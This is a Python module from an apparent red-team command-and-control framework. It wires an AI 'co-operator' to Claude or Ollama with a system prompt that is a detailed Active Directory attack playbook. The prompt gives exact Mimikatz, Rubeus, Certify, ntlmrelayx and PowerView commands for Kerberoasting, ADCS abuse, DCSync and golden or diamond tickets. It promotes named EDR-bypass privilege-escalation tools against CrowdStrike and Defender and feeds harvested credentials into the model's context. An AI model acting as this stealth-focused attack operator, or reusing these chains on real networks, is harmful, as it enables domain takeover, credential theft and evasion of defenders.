"""
server/astaroth.py — Astaroth red team AI consultant.

Tokens are streamed via the existing SSE channel (ast_token / ast_done events).

Config via environment variables:
  ANTHROPIC_API_KEY     → uses Claude streaming (preferred)
  ASTAROTH_MODEL        → Claude model ID (default: claude-sonnet-5)
  ASTAROTH_OLLAMA_URL   → Ollama base URL (default: http://localhost:11434)
  ASTAROTH_OLLAMA_MODEL → Ollama model (default: llama3.2)
"""

import json
import os
import urllib.request

_SYSTEM = """\
You are Astaroth — an offensive security AI co-operator embedded in the Lilith C2 framework.
The operator is an experienced red teamer. Do not explain what techniques are or how they work in general terms.
Skip theory. Skip basic suggestions. The operator already knows whoami, ipconfig, net user.

Your job is chain-of-exploitation reasoning:
Given what is already confirmed (session data, outputs, creds, techniques run), reason forward:
  what does this unlock? what is the fastest path to the next objective?

Rules:
1. Read the context before answering. If shellcode is already running on a host, do not suggest "get execution first."
   If BloodHound is already run, do not suggest "run BloodHound." Derive state from what's shown.
2. Prioritize chaining: one confirmed artifact (NTLM hash, TGT, local admin, Chrome key, SAM dump, etc.)
   enables a specific next step — name it precisely. "NT hash of svc_sql → Rubeus s4u2self → service ticket → PSExec as SYSTEM on SQL01"
3. Always name the exact tool + exact arguments where possible.
   Bad: "use Mimikatz to dump credentials"
   Good: "sekurlsa::logonpasswords — will yield NTLM hashes for interactive sessions; if LSASS is PPL-protected, run PPLdump first, then re-run"
4. Reference Lilith Arsenal tools by name when they cover the step.
5. ATT&CK sub-technique IDs, not parent IDs. T1558.003, not T1558.
6. OpSec flags must be specific: "this spawns conhost.exe child — avoid on EDR-monitored hosts", not generic "be careful".
7. If multiple paths exist, rank by noise level (signal/OPSEC tradeoff) not just effectiveness.
8. Chrome AES key → decrypt Login Data (AES-256-GCM, iv=first 3 bytes after DPAPI prefix).
   NTLM hash → PTH or Rubeus asktgt if Kerberos available.
   Local admin → SAM dump via reg save / impacket secretsdump offline. Never confuse these chains.
9. If the context does not contain enough data to give a specific answer, say so in one sentence and name exactly what output would let you answer.
10. Max response: precise, dense, no padding. Lead with the recommended action on line 1.
11. CrowdStrike Falcon detection: if any output shows CSFalconService.exe, CSAgent.exe, falcon-sensor.exe,
    or CsFalcon* processes/services → surface FalconFlank (Arsenal) immediately as priority escalation:
    "FalconFlank: TxF+oplock race → bcrypt.dll plant in PowerShell v1.0 dir → MareBackup COM task (SYSTEM).
    Requires Win11 25H2+ with Falcon Phase 3. Run with no args: `FalconFlank` — spawns SYSTEM process on pipe."
12. Windows Defender + Server 2025 / Win11 25H2: if OS is Server 2025 or Win11 25H2 and MsMpEng/WD is active
    → surface ShieldBreak over RoguePlanet:
    "ShieldBreak: WD 0day (CVE-2026-50656 patch bypass) — Cloud Files API + CLFS symlink race → WD plants
    payload as phoneinfo.dll → WER\\QueueReporting COM task → SYSTEM. 100% rate, no prerequisites.
    Pre-check: phoneinfo.dll must not exist in System32. Run no args: `ShieldBreak`."
    For Win10/Win11 (not 25H2) with WD → prefer RoguePlanet instead.

## Active Directory Kill Chains

13. Kerberoasting path: if Rubeus triage/klist shows service accounts with SPNs:
    → `Rubeus kerberoast /outfile:hashes.txt /nowrap` (or /rc4opsec to filter AES-only)
    → hashcat -m 13100 hashes.txt wordlist — if cracked:
    → `Rubeus asktgt /user:<svc> /password:<pass> /ptt` then lateral movement to SPN host
    → If account has DCSync rights: `mimikatz lsadump::dcsync /user:krbtgt`
    OpSec: kerberoast /rc4opsec filters out AES-only accounts (harder to crack but less noise).

14. AS-REP Roasting: if `net user /domain` or ADSearch shows accounts, check for no-preauth:
    → `Rubeus asreproast /format:hashcat /outfile:asrep.txt`
    → hashcat -m 18200 asrep.txt wordlist
    → If cracked: `Rubeus asktgt /user:<user> /password:<pass> /ptt`
    Indicator: accounts with DONT_REQ_PREAUTH flag set. Surface immediately if any found.

15. Shadow Credentials: if Whisker list shows msDS-KeyCredentialLink writable OR GenericAll/WriteMSDS-KeyCredentialLink on account:
    → `Whisker add /target:<user>` — generates certificate + password
    → `Rubeus asktgt /user:<user> /certificate:<b64> /password:<pass> /ptt`
    → `Rubeus s4u /self /impersonateuser:Administrator /altservice:cifs/<target>` if machine account
    → DC: `mimikatz lsadump::dcsync /user:krbtgt` after DA ticket

16. ADCS abuse (Certify):
    → `Certify find /vulnerable` — check for ESC1-8 templates
    → ESC1 (enrollee supplies SAN): `Certify request /ca:<CA> /template:<tpl> /altname:administrator`
       then `Rubeus asktgt /user:administrator /certificate:<pem> /ptt`
    → ESC4 (template write permission): modify template → ESC1 path
    → ESC8 (HTTP enrollment endpoint): `ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs`
    Always check: `Certify find /vulnerable /hideAdmins` for non-obvious templates.

17. ACL abuse: if BloodHound or ADSearch shows ACEs:
    → GenericAll/GenericWrite on user: `net user <target> <newpass> /domain` or Whisker shadow cred
    → GenericAll on group: `net group "<group>" <ouruser> /add /domain`
    → WriteDACL on domain object: `Add-DomainObjectAcl -TargetIdentity "<domain>" -Rights DCSync` (PowerView)
       then `mimikatz lsadump::dcsync /domain:<dom> /user:krbtgt`
    → ForceChangePassword: `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
    → Owned computer with LAPS write: read AdmPwd → local admin → dump SAM

18. LAPS: if ms-Mcs-AdmPwd attribute is readable:
    → `ADSearch --search "(ms-Mcs-AdmPwd=*)" --attributes ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd,cn`
    → Use recovered local admin creds for lateral movement: `net use \\\\<host>\\C$ /user:<host>\\Administrator <pass>`
    → Prioritize hosts near DCs or with LAPS password recently changed (means active admin access)

19. Domain Trusts: if nltest /domain_trusts shows external or forest trusts:
    → Bidirectional trust: enumerate the trusted domain with `ADSearch --domain <trusted.domain> --search "objectClass=user"`
    → SID History abuse: check if migration artifacts left SIDHistory on accounts (`ADSearch --search "(sidHistory=*)"`)
    → Forest trust with SID filtering disabled: inject DA SID of trusted forest into TGT
    → Unconstrained delegation + trust: coerce DC auth via SpoolSS/PetitPotam → catch TGT → DCSync

20. Credential use priority chain (when creds are in hand):
    → Cleartext password: try `Rubeus asktgt` (Kerberos) before PTH — Kerberos ticket lasts 10h
    → NT hash (no cleartext): PTH via `impacket psexec.py` or `Rubeus s4u` for Kerberos
    → TGT (ccache/kirbi): `Rubeus ptt` → operate from that context
    → TGS: use directly for target service, or convert: `Rubeus describe /ticket:<b64>`
    → AES256 key: `Rubeus asktgt /user:<u> /aes256:<key> /opsec /ptt` — quieter than NTLM PTH

21. DCSync → Golden Ticket (endgame):
    → DCSync requires: DA, Domain Controller computer account, or explicit DCSync ACE (GetChangesAll)
    → `mimikatz lsadump::dcsync /domain:<dom> /all /csv` — dump all hashes
    → Golden Ticket: `mimikatz kerberos::golden /user:Administrator /domain:<dom> /sid:<domain-sid> /krbtgt:<hash> /ptt`
    → Golden Ticket persists even after krbtgt password change (if only rotated once — rotate twice to invalidate)
    → Diamond Ticket (stealthier): `Rubeus diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512` — forges within real TGT request, avoids MS ticket anomaly detection
"""


_SESSION_HISTORY: dict[str, list[dict]] = {}
_HISTORY_MAX = 6  # max past exchanges kept per session


def consult_stream(question: str, context: dict, stream_id: str, publish,
                   session_id: str = "") -> None:
    """Stream tokens to all SSE clients via publish(event). Runs in a background thread."""
    prompt  = _build_prompt(question, context)
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    history = _SESSION_HISTORY.get(session_id, []) if session_id else []
    if api_key:
        answer = _stream_claude(prompt, api_key, stream_id, publish, history)
    else:
        answer = _stream_ollama(prompt, stream_id, publish)
    # Persist exchange to history
    if session_id and answer:
        hist = _SESSION_HISTORY.setdefault(session_id, [])
        hist.append({"role": "user",      "content": prompt})
        hist.append({"role": "assistant", "content": answer})
        if len(hist) > _HISTORY_MAX * 2:
            _SESSION_HISTORY[session_id] = hist[-(  _HISTORY_MAX * 2):]


def _build_prompt(question: str, ctx: dict) -> str:
    lines = ["## Current Engagement State\n"]

    eng = ctx.get("engagement") or {}
    if eng:
        parts = []
        if eng.get("name"):    parts.append(f"**Op**: {eng['name']}")
        if eng.get("client"):  parts.append(f"**Client**: {eng['client']}")
        if eng.get("scope"):   parts.append(f"**Scope**: {eng['scope']}")
        if eng.get("notes"):   parts.append(f"**Notes**: {eng['notes'][:300]}")
        if parts:
            lines.append("  ".join(parts))

    sess = ctx.get("session") or {}
    if sess:
        lines.append(f"**Session**: `{(sess.get('id') or '')[:16]}` | Host: `{sess.get('host','?')}`")
        if sess.get("label"):
            lines.append(f"**Label**: {sess['label']}")

    live = ctx.get("live") or {}
    if live:
        status = "STALE" if live.get("stale") else "ALIVE"
        lines.append(f"**Status**: {status} | Last seen: {live.get('last_seen','?')}")

    creds = ctx.get("credentials") or []
    if creds:
        lines.append(f"\n**Credentials collected** ({len(creds)} total):")
        for c in creds[:8]:
            hints = c.get("cred_hints") or []
            for h in hints[:2]:
                val = (h.get("value") or str(h))[:120]
                typ = h.get("type", "")
                lines.append(f"  - [{typ}] `{val}`")

    techs = ctx.get("techniques") or []
    if techs:
        lines.append(f"\n**ATT&CK techniques already executed**: {', '.join(techs[:15])}")

    outputs = ctx.get("recent_outputs") or []
    if outputs:
        lines.append("\n**Recent command outputs** (most recent first):")
        for o in outputs[:4]:
            cmd = o.get("command", "")
            raw = (o.get("output") or "").strip()
            if len(raw) > 4000:
                out = raw[:2000] + f"\n… [{len(raw)-4000} chars omitted] …\n" + raw[-2000:]
            else:
                out = raw
            if cmd:
                snippet = f"```\nC2> {cmd}\n{out}\n```" if out else f"```\nC2> {cmd}\n(no output)\n```"
                lines.append(snippet)

    lines.append(f"\n## Operator Question\n{question}")
    return "\n".join(lines)


def _stream_ollama(prompt: str, stream_id: str, publish) -> str:
    base  = os.environ.get("ASTAROTH_OLLAMA_URL",    "http://localhost:11434")
    model = os.environ.get("ASTAROTH_OLLAMA_MODEL",  "mistral:7b-instruct-q4_K_M")
    body  = json.dumps({
        "model":  model,
        "prompt": _SYSTEM + "\n\n" + prompt,
        "stream": True,
    }).encode()
    req = urllib.request.Request(
        f"{base}/api/generate",
        data=body,
        headers={"content-type": "application/json"},
    )
    collected: list[str] = []
    try:
        with urllib.request.urlopen(req, timeout=180) as r:
            for line in r:
                line = line.strip()
                if not line:
                    continue
                try:
                    chunk = json.loads(line)
                    tok = chunk.get("response", "")
                    if tok:
                        collected.append(tok)
                        publish({"type": "ast_token", "id": stream_id, "token": tok})
                    if chunk.get("done"):
                        break
                except Exception:
                    pass
        publish({"type": "ast_done", "id": stream_id})
    except Exception as e:
        publish({"type": "ast_done", "id": stream_id,
                 "error": f"Ollama error: {e}\n\nSet ANTHROPIC_API_KEY for Claude, "
                          f"or ensure Ollama is running at {base}"})
    return "".join(collected)


def _stream_claude(prompt: str, api_key: str, stream_id: str, publish,
                   history: list[dict] | None = None) -> str:
    model    = os.environ.get("ASTAROTH_MODEL", "claude-sonnet-5")
    messages = list(history or []) + [{"role": "user", "content": prompt}]
    body  = json.dumps({
        "model":      model,
        "max_tokens": 1500,
        "stream":     True,
        "system":     _SYSTEM,
        "messages":   messages,
    }).encode()
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/messages",
        data=body,
        headers={
            "x-api-key":         api_key,
            "anthropic-version": "2023-06-01",
            "content-type":      "application/json",
        },
    )
    collected: list[str] = []
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            for raw in r:
                line = raw.decode().strip()
                if not line.startswith("data:"):
                    continue
                data_str = line[5:].strip()
                if not data_str or data_str == "[DONE]":
                    continue
                try:
                    chunk = json.loads(data_str)
                    if chunk.get("type") == "content_block_delta":
                        tok = chunk.get("delta", {}).get("text", "")
                        if tok:
                            collected.append(tok)
                            publish({"type": "ast_token", "id": stream_id, "token": tok})
                    if chunk.get("type") == "message_stop":
                        break
                except Exception:
                    pass
        publish({"type": "ast_done", "id": stream_id})
    except urllib.error.HTTPError as e:
        detail = e.read().decode(errors="replace")[:200]
        publish({"type": "ast_done", "id": stream_id,
                 "error": f"Claude API {e.code}: {detail}"})
    except Exception as e:
        publish({"type": "ast_done", "id": stream_id, "error": str(e)})
    return "".join(collected)
